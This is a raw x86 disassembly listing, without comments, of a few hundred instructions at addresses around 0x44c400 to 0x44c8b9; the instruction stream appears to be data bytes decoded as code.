  44c400:	dec    eax
  44c401:	pusha  
  44c402:	inc    esp
  44c403:	and    ah,BYTE PTR [edx]
  44c405:	xor    eax,0x48445a
  44c40a:	dec    esi
  44c40b:	or     ah,BYTE PTR [eax]
  44c40d:	pop    edx
  44c40e:	or     BYTE PTR [esi+0x30085c8b],bl
  44c414:	add    BYTE PTR [eax+0x401010f3],0x0
  44c41b:	add    BYTE PTR [eax],al
  44c41d:	inc    ecx
  44c41e:	add    BYTE PTR [edx],al
  44c420:	inc    ecx
  44c421:	dec    eax
  44c422:	inc    ecx
  44c423:	and    BYTE PTR [eax],cl
  44c425:	add    BYTE PTR [eax],al
  44c427:	bound  edx,QWORD PTR [eax+0x30]
  44c42a:	adc    BYTE PTR ds:[eax],al
  44c42d:	add    al,BYTE PTR [esp+ecx*1+0x70]
  44c431:	or     BYTE PTR [ecx],al
  44c433:	jp     0x44c49d
  44c435:	or     al,0x2a
  44c437:	inc    eax
  44c438:	mov    al,ds:0x605209
  44c43d:	test   BYTE PTR [eax],al
  44c43f:	add    BYTE PTR [edx],0x1b
  44c442:	add    cl,al
  44c444:	add    BYTE PTR [eax],al
  44c446:	add    BYTE PTR [eax],dl
  44c448:	cmp    BYTE PTR [eax-0x58],al
  44c44b:	cwde   
  44c44c:	add    BYTE PTR [eax-0x79],al
  44c44f:	add    al,0x70
  44c451:	add    DWORD PTR [eax+eax*2],eax
  44c454:	add    BYTE PTR [eax-0x50],0x1
  44c458:	adc    BYTE PTR [ebx+eiz*2],cl
  44c45b:	or     eax,DWORD PTR [eax]
  44c45d:	mov    BYTE PTR [edx+ebx*1+0x22],al
  44c461:	mov    esp,DWORD PTR [eax]
  44c463:	add    DWORD PTR [eax],eax
  44c465:	inc    esp
  44c466:	add    al,0x1
  44c468:	rol    BYTE PTR [ecx],1
  44c46a:	mov    ds:0x40000,al
  44c46f:	pusha  
  44c470:	add    BYTE PTR [eax+0x0],al
  44c473:	and    al,BYTE PTR [ecx-0x78]
  44c476:	test   DWORD PTR [eax],ecx
  44c478:	adc    BYTE PTR [ebx],bl
  44c47a:	add    ah,al
  44c47c:	add    eax,DWORD PTR [eax-0x65]
  44c47f:	add    al,BYTE PTR [ecx+edx*8]
  44c482:	and    BYTE PTR [ecx-0x6f],al
  44c485:	add    BYTE PTR ds:0x82400440,al
  44c48b:	inc    eax
  44c48c:	add    BYTE PTR [eax],ah
  44c48e:	or     al,BYTE PTR [eax+0x30]
  44c491:	and    BYTE PTR [eax+0x6e000048],al
  44c497:	add    BYTE PTR [eax],cl
  44c499:	imul   ecx,DWORD PTR [eax+0x40010010],0x2020000
  44c4a3:	or     DWORD PTR [eax],eax
  44c4a5:	or     edx,DWORD PTR [eax-0x7f]
  44c4a8:	add    BYTE PTR [edx],cl
  44c4aa:	inc    esp
  44c4ab:	add    DWORD PTR [eax],eax
  44c4ad:	inc    eax
  44c4ae:	and    al,0x20
  44c4b0:	and    BYTE PTR [eax],ah
  44c4b2:	test   BYTE PTR [edx],cl
  44c4b4:	add    BYTE PTR [eax+eax*2],al
  44c4b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c4b8:	add    BYTE PTR [ecx],al
  44c4ba:	add    BYTE PTR [eax+0x7040],ah
  44c4c0:	and    BYTE PTR [eax],ah
  44c4c2:	xor    BYTE PTR [eax],dl
  44c4c4:	pop    edx
  44c4c5:	add    BYTE PTR [eax],al
  44c4c7:	mov    bl,0x90
  44c4c9:	add    BYTE PTR [eax],ah
  44c4cb:	push   ebx
  44c4cc:	add    al,0x40
  44c4ce:	adc    BYTE PTR [eax],dl
  44c4d0:	add    BYTE PTR [eax],cl
  44c4d2:	add    BYTE PTR [ecx+eax*1],dl
  44c4d5:	adc    DWORD PTR [esi],eax
  44c4d7:	inc    esp
  44c4d8:	add    BYTE PTR [eax],al
  44c4da:	mov    WORD PTR [eax],?
  44c4dc:	sbb    BYTE PTR [eax-0x5c],ch
  44c4df:	add    BYTE PTR [eax],al
  44c4e1:	or     BYTE PTR [eax],al
  44c4e3:	inc    edx
  44c4e4:	add    al,0x4
  44c4e6:	or     BYTE PTR [eax],al
  44c4e8:	add    BYTE PTR [eax],al
  44c4ea:	or     DWORD PTR [eax],eax
  44c4ec:	add    BYTE PTR [eax+0x4903460b],al
  44c4f2:	inc    eax
  44c4f3:	xor    al,BYTE PTR [eax+0x0]
  44c4f6:	add    DWORD PTR [eax-0x2a27ffc0],esp
  44c4fc:	add    dl,BYTE PTR [eax]
  44c4fe:	add    BYTE PTR [eax+0x2],al
  44c501:	lods   al,BYTE PTR ds:[esi]
  44c502:	xor    al,0x1
  44c504:	sub    BYTE PTR [edx],al
  44c506:	add    BYTE PTR [eax],al
  44c508:	sub    al,BYTE PTR [eax]
  44c50a:	add    BYTE PTR [edx+0x49440],cl
  44c510:	adc    BYTE PTR [esi+0x18020080],al
  44c516:	adc    al,ah
  44c518:	or     BYTE PTR [ebx],cl
  44c51a:	add    BYTE PTR [eax+0x4501180],al
  44c520:	or     al,0x2c
  44c522:	and    BYTE PTR [eax],al
  44c524:	mov    BYTE PTR [eax],al
  44c526:	adc    ah,BYTE PTR [eax+0x20]
  44c529:	and    BYTE PTR [eax],al
  44c52b:	add    BYTE PTR [eax],0x83
  44c52e:	add    BYTE PTR [esi],al
  44c530:	inc    edx
  44c531:	sbb    BYTE PTR [eax],0x1
  44c534:	add    al,0x40
  44c536:	push   ecx
  44c537:	pusha  
  44c538:	pusha  
  44c539:	or     BYTE PTR [eax+0x48],al
  44c53c:	adc    BYTE PTR [eax-0x7ef7d9e6],bl
  44c542:	add    eax,0x10040024
  44c547:	adc    al,BYTE PTR [eax+0x18]
  44c54a:	mov    al,0xba
  44c54c:	add    BYTE PTR [eax+eax*1],al
  44c54f:	add    BYTE PTR fs:[edx+esi*1],al
  44c553:	mov    DWORD PTR [ecx],eax
  44c555:	pusha  
  44c556:	mov    BYTE PTR [ebp+eax*1+0x57a50000],al
  44c55d:	loopne 0x44c5c4
  44c55f:	or     eax,0x40206480
  44c564:	add    BYTE PTR [eax+0xa],al
  44c567:	add    BYTE PTR [edx],al
  44c569:	add    BYTE PTR [edx],cl
  44c56b:	and    eax,DWORD PTR [esi]
  44c56d:	add    BYTE PTR [edi+0x2],ah
  44c570:	sbb    DWORD PTR [esp+ecx*1-0x6fac9bbe],edx
  44c577:	mov    BYTE PTR [eax],al
  44c579:	add    BYTE PTR [edx-0x6fd9ffe0],dl
  44c57f:	xor    BYTE PTR [eax+0x30],al
  44c582:	add    BYTE PTR [eax],al
  44c584:	add    DWORD PTR [eax],esp
  44c586:	add    al,ch
  44c588:	nop
  44c589:	add    BYTE PTR [edi],ch
  44c58b:	push   ds
  44c58c:	inc    esp
  44c58d:	test   BYTE PTR [ebx],cl
  44c58f:	add    eax,0x5000c048
  44c594:	adc    al,0x1
  44c596:	and    eax,eax
  44c598:	and    al,0x20
  44c59b:	and    BYTE PTR [eax+0x5c],ah
  44c59e:	adc    DWORD PTR [edx+ecx*8+0x18402044],edx
  44c5a5:	add    eax,DWORD PTR [ecx]
  44c5a7:	add    BYTE PTR [eax+eax*2-0x2dbf8ffe],cl
  44c5ae:	add    ah,BYTE PTR [eax]
  44c5b0:	inc    ebp
  44c5b1:	adc    BYTE PTR [eax],al
  44c5b3:	test   BYTE PTR [esi],al
  44c5b5:	add    DWORD PTR [eax],0x0
  44c5b8:	dec    eax
  44c5b9:	or     BYTE PTR [eax+0x400000],0x1
  44c5c0:	inc    eax
  44c5c1:	and    BYTE PTR [eax],al
  44c5c3:	add    DWORD PTR [esi],eax
  44c5c5:	jo     0x44c5cb
  44c5c7:	and    DWORD PTR [ecx+eax*1],eax
  44c5ca:	dec    ebx
  44c5cb:	add    al,BYTE PTR [eax]
  44c5cd:	or     BYTE PTR [eax+0x30],dl
  44c5d0:	retf   0x68
  44c5d3:	or     BYTE PTR [eax],al
  44c5d5:	mov    dh,0x18
  44c5d7:	add    eax,DWORD PTR [eax+eax*2]
  44c5da:	inc    eax
  44c5db:	out    0xa0,eax
  44c5dd:	adc    BYTE PTR [eax+eax*2+0x0],cl
  44c5e1:	push   eax
  44c5e2:	xor    DWORD PTR [eax-0x57fdb800],ecx
  44c5e8:	and    BYTE PTR [eax],al
  44c5ea:	add    BYTE PTR [eax],cl
  44c5ec:	or     al,0x15
  44c5ee:	bound  eax,QWORD PTR [eax+0x24]
  44c5f1:	and    BYTE PTR [eax],ch
  44c5f3:	add    DWORD PTR [eax],eax
  44c5f5:	or     ah,BYTE PTR [eax]
  44c5f7:	inc    eax
  44c5f8:	add    BYTE PTR ds:0x81a01203,al
  44c5fe:	and    cl,al
  44c600:	mov    edx,DWORD PTR [eax+0x61000005]
  44c606:	and    al,BYTE PTR [eax]
  44c608:	rcl    BYTE PTR [eax],1
  44c60a:	add    BYTE PTR [eax],dl
  44c60c:	lods   al,BYTE PTR ds:[esi]
  44c60d:	add    BYTE PTR [eax],ah
  44c60f:	or     BYTE PTR [eax],al
  44c611:	add    BYTE PTR [eax+eax*2],dl
  44c614:	mov    BYTE PTR [eax],ah
  44c616:	pop    eax
  44c617:	add    BYTE PTR [ecx],ch
  44c619:	inc    eax
  44c61a:	mov    al,BYTE PTR [eax+0x50]
  44c61d:	or     DWORD PTR [eax],ecx
  44c61f:	add    BYTE PTR [ecx],al
  44c621:	or     BYTE PTR [ebp+0x40],0x8b
  44c625:	add    al,0x11
  44c627:	push   edx
  44c628:	add    BYTE PTR [ecx],0x31
  44c62b:	inc    eax
  44c62c:	add    al,bl
  44c62e:	mov    BYTE PTR [edx],al
  44c630:	add    BYTE PTR [eax],ah
  44c632:	add    BYTE PTR [eax+0x30],al
  44c635:	push   es
  44c636:	inc    eax
  44c637:	add    BYTE PTR [esi+edx*2],dl
  44c63a:	adc    edx,eax
  44c63c:	ret    0x800
  44c63f:	inc    eax
  44c640:	push   eax
  44c641:	add    BYTE PTR [ecx+esi*4],al
  44c644:	add    al,0x44
  44c646:	add    BYTE PTR [eax],al
  44c648:	mov    al,ds:0x204203c1
  44c64d:	add    BYTE PTR [ecx+0x4a48000],dl
  44c653:	and    BYTE PTR [ebx],cl
  44c655:	push   es
  44c656:	or     BYTE PTR [eax],0x20
  44c659:	dec    eax
  44c65a:	add    BYTE PTR [ecx],0x4
  44c65d:	add    BYTE PTR [eax+0x2000014],dh
  44c663:	xchg   edx,eax
  44c664:	and    al,0x40
  44c666:	or     DWORD PTR [eax+0x1002000c],esp
  44c66c:	add    BYTE PTR [eax],dh
  44c66e:	add    al,BYTE PTR [eax+0x20082200]
  44c674:	add    BYTE PTR [eax],al
  44c676:	pusha  
  44c677:	add    BYTE PTR [eax],al
  44c679:	inc    esp
  44c67a:	or     BYTE PTR [edx-0x7f7bf7b4],dl
  44c680:	add    al,BYTE PTR [eax+0x0]
  44c683:	and    BYTE PTR [eax+0x1],al
  44c686:	add    al,0x19
  44c688:	mov    al,ds:0x41c00001
  44c68d:	mov    BYTE PTR [ecx],cl
  44c68f:	inc    esi
  44c690:	add    BYTE PTR [edx+eax*1],al
  44c693:	inc    eax
  44c694:	add    esp,0x911a4402
  44c69a:	and    BYTE PTR [ecx+eax*1-0x5f],dl
  44c69e:	pop    es
  44c69f:	add    BYTE PTR [esi],dh
  44c6a1:	add    bl,BYTE PTR [eax]
  44c6a3:	xor    BYTE PTR [ecx+0x10114800],0x0
  44c6aa:	sub    al,0x2
  44c6ac:	add    BYTE PTR [ebx+0x0],al
  44c6af:	add    al,0x2
  44c6b1:	add    ah,BYTE PTR [eax]
  44c6b3:	jo     0x44c635
  44c6b5:	test   DWORD PTR [eax],eax
  44c6b7:	or     DWORD PTR [eax],eax
  44c6b9:	dec    eax
  44c6ba:	inc    edx
  44c6bb:	adc    BYTE PTR [eax],al
  44c6bd:	sbb    BYTE PTR [edi],al
  44c6bf:	add    BYTE PTR [eax],al
  44c6c1:	inc    eax
  44c6c2:	adc    al,0x80
  44c6c4:	adc    DWORD PTR [eax],edx
  44c6c6:	or     BYTE PTR [ebp+0x704a8010],ah
  44c6cc:	rol    BYTE PTR [eax],0x13
  44c6cf:	add    BYTE PTR [eax],ah
  44c6d1:	and    BYTE PTR [eax+0x40],al
  44c6d4:	adc    al,BYTE PTR [eax+ebp*1]
  44c6d7:	adc    BYTE PTR [eax+eax*1],al
  44c6da:	add    BYTE PTR [eax+0x10],ah
  44c6dd:	add    DWORD PTR [eax+eax*2+0x2a921aa8],eax
  44c6e4:	inc    ecx
  44c6e5:	inc    eax
  44c6e6:	add    BYTE PTR [eax+0x67],ah
  44c6e9:	adc    BYTE PTR [ecx+0xa],dl
  44c6ec:	add    al,BYTE PTR [ecx]
  44c6ee:	adc    BYTE PTR [eax],ah
  44c6f0:	inc    ecx
  44c6f1:	add    BYTE PTR [eax+0x6451042c],al
  44c6f7:	rol    BYTE PTR [eax],0x18
  44c6fa:	or     BYTE PTR [edx],al
  44c6fc:	add    DWORD PTR [eax+0xa84013],ecx
  44c702:	add    BYTE PTR [eax+0x13],dh
  44c705:	xchg   edx,eax
  44c706:	and    BYTE PTR [edx],al
  44c708:	js     0x44c70e
  44c70a:	add    BYTE PTR [ecx],al
  44c70c:	push   ebx
  44c70d:	xchg   sp,ax
  44c70f:	inc    eax
  44c710:	dec    edx
  44c711:	add    al,0x0
  44c713:	add    BYTE PTR [ebx-0x24],dl
  44c716:	xor    BYTE PTR [edx],cl
  44c718:	and    ecx,DWORD PTR [eax+eax*1]
  44c71b:	adc    DWORD PTR [edx-0x76fcf4fe],eax
  44c721:	and    BYTE PTR [esi],ah
  44c723:	ror    BYTE PTR [eax],0x40
  44c726:	add    BYTE PTR [eax+0x0],al
  44c729:	or     BYTE PTR [eax+0x43004400],al
  44c72f:	bound  eax,QWORD PTR [eax]
  44c731:	push   eax
  44c732:	add    BYTE PTR [ebx],al
  44c734:	sub    BYTE PTR [eax],al
  44c736:	mov    es,WORD PTR [eax+eax*2]
  44c739:	retf   0xa628
  44c73c:	mov    eax,DWORD PTR [eax]
  44c73e:	and    DWORD PTR [eax],edx
  44c740:	inc    eax
  44c741:	add    BYTE PTR [eax],ah
  44c743:	add    cl,cl
  44c745:	add    BYTE PTR ds:0x20490082,ah
  44c74b:	or     BYTE PTR [edx],dl
  44c74d:	fisub  DWORD PTR [eax+0x7008402]
  44c753:	dec    edx
  44c754:	adc    BYTE PTR [eax],0x19
  44c757:	and    BYTE PTR [edx-0x10],cl
  44c75a:	add    al,0x1
  44c75c:	adc    BYTE PTR [eax],al
  44c75e:	fwait
  44c75f:	or     BYTE PTR [eax+ecx*1-0x80],al
  44c763:	inc    eax
  44c764:	inc    eax
  44c765:	add    BYTE PTR [edx-0x7fe79ae8],al
  44c76b:	add    ch,BYTE PTR [eax]
  44c76d:	lock add eax,0x520c0040
  44c773:	add    BYTE PTR [eax+eax*4+0x1211a8],cl
  44c77a:	and    BYTE PTR [eax],al
  44c77c:	adc    BYTE PTR [eax],al
  44c77e:	adc    BYTE PTR [eax-0x2c],bl
  44c781:	or     BYTE PTR [eax],al
  44c783:	inc    eax
  44c784:	add    BYTE PTR [eax-0x6ffdefc0],al
  44c78a:	inc    ecx
  44c78b:	and    al,0x1
  44c78d:	add    BYTE PTR [eax],dl
  44c78f:	and    BYTE PTR [edx],al
  44c791:	xor    al,BYTE PTR [ecx+0x4]
  44c794:	add    al,0x0
  44c796:	add    BYTE PTR [eax],ch
  44c798:	and    eax,0x4040
  44c79d:	inc    eax
  44c79e:	test   al,0x1
  44c7a0:	add    BYTE PTR [eax],ah
  44c7a2:	add    BYTE PTR [esi+0x1570808],al
  44c7a8:	ret    0x9014
  44c7ab:	add    BYTE PTR [eax],cl
  44c7ad:	adc    BYTE PTR [edx+0x20900000],al
  44c7b3:	add    al,0x4
  44c7b5:	and    BYTE PTR [eax],al
  44c7b7:	inc    eax
  44c7b8:	add    eax,0x4501c010
  44c7bd:	lds    eax,FWORD PTR [edx]
  44c7bf:	mov    WORD PTR [eax+0x148a004],es
  44c7c5:	or     DWORD PTR [eax+0x2c000f],eax
  44c7cb:	inc    edx
  44c7cc:	add    BYTE PTR [eax],cl
  44c7ce:	add    BYTE PTR [edx+eax*1],0x5
  44c7d2:	enter  0x4818,0x84
  44c7d6:	add    al,0x8
  44c7d8:	add    DWORD PTR [eax+0x42],edx
  44c7db:	int    0x43
  44c7dd:	nop
  44c7de:	or     BYTE PTR [eax],al
  44c7e0:	or     BYTE PTR [eax+0x18ad110],dh
  44c7e6:	and    BYTE PTR [eax],al
  44c7e8:	adc    BYTE PTR [eax+0x18],ah
  44c7eb:	or     BYTE PTR [eax],cl
  44c7ed:	adc    BYTE PTR [eax],0x60
  44c7f0:	and    BYTE PTR [eax+0xe],cl
  44c7f3:	add    bh,al
  44c7f5:	or     al,0x22
  44c7f7:	add    BYTE PTR [esi+0x5a],dl
  44c7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c7fb:	add    cl,ah
  44c7fd:	mov    al,ds:0x90056802
  44c802:	add    BYTE PTR [ebx+0x11],cl
  44c805:	or     BYTE PTR ds:0x1104000,al
  44c80b:	add    BYTE PTR [eax+0x2000808],0x1
  44c812:	and    BYTE PTR [edx+0x2],al
  44c815:	or     al,BYTE PTR [eax]
  44c817:	add    BYTE PTR [eax],ah
  44c819:	nop
  44c81a:	inc    eax
  44c81b:	rol    BYTE PTR [edx],0x1
  44c81e:	push   edx
  44c81f:	inc    eax
  44c820:	add    BYTE PTR [eax],al
  44c822:	and    BYTE PTR [ecx+edx*1],al
  44c825:	inc    edx
  44c826:	fwait
  44c827:	test   al,0x24
  44c829:	inc    eax
  44c82a:	inc    eax
  44c82b:	add    BYTE PTR [eax+0x4],al
  44c82e:	add    BYTE PTR [ebx],al
  44c830:	add    BYTE PTR [eax+0x13412004],al
  44c836:	sbb    al,0x90
  44c838:	push   eax
  44c839:	and    BYTE PTR [ecx+edx*4+0x5],cl
  44c83d:	add    BYTE PTR [ecx],ah
  44c83f:	mov    es,WORD PTR [edx+0x40]
  44c842:	add    BYTE PTR [eax],al
  44c844:	push   eax
  44c845:	add    DWORD PTR [ecx],eax
  44c847:	add    BYTE PTR [eax+eax*4],0x8
  44c84b:	add    al,0x1
  44c84d:	or     al,0x40
  44c84f:	adc    cl,BYTE PTR [eax]
  44c851:	inc    eax
  44c852:	nop
  44c853:	push   cs
  44c854:	add    al,BYTE PTR [ecx+0x12]
  44c857:	add    BYTE PTR [eax],0x32
  44c85a:	add    ch,BYTE PTR [eax]
  44c85c:	add    BYTE PTR [ecx+0x21080000],0x9c
  44c863:	sub    BYTE PTR [eax],0x2
  44c866:	add    BYTE PTR [eax+0x20061008],cl
  44c86c:	adc    DWORD PTR [eax-0x6fc4f5d8],eax
  44c872:	xor    BYTE PTR [eax],ah
  44c874:	daa    
  44c875:	inc    eax
  44c876:	and    ch,BYTE PTR [esp+ecx*4]
  44c879:	and    BYTE PTR [eax],0x20
  44c87c:	or     BYTE PTR [eax],ah
  44c87e:	add    al,0x0
  44c880:	add    BYTE PTR [esi+0x0],al
  44c883:	bound  ecx,QWORD PTR [edx+0x820d610]
  44c889:	and    BYTE PTR [ecx],al
  44c88b:	inc    eax
  44c88c:	add    cl,BYTE PTR [ecx]
  44c88e:	add    DWORD PTR [eax+0x4c122000],ecx
  44c894:	retf   0x8199
  44c897:	sbb    DWORD PTR [ecx+0x420838],eax
  44c89d:	nop
  44c89e:	or     BYTE PTR [eax],dh
  44c8a0:	add    BYTE PTR [eax-0x55d7fff8],cl
  44c8a6:	jle    0x44c8f1
  44c8a8:	or     BYTE PTR [ecx],al
  44c8aa:	add    BYTE PTR [eax],al
  44c8ac:	mov    BYTE PTR [eax+0x0],cl
  44c8af:	add    al,BYTE PTR [eax+0x2]
  44c8b2:	or     DWORD PTR [edx+ecx*1+0x40],eax
  44c8b6:	add    BYTE PTR [eax],0x18
  44c8b9:	.byte 0x2
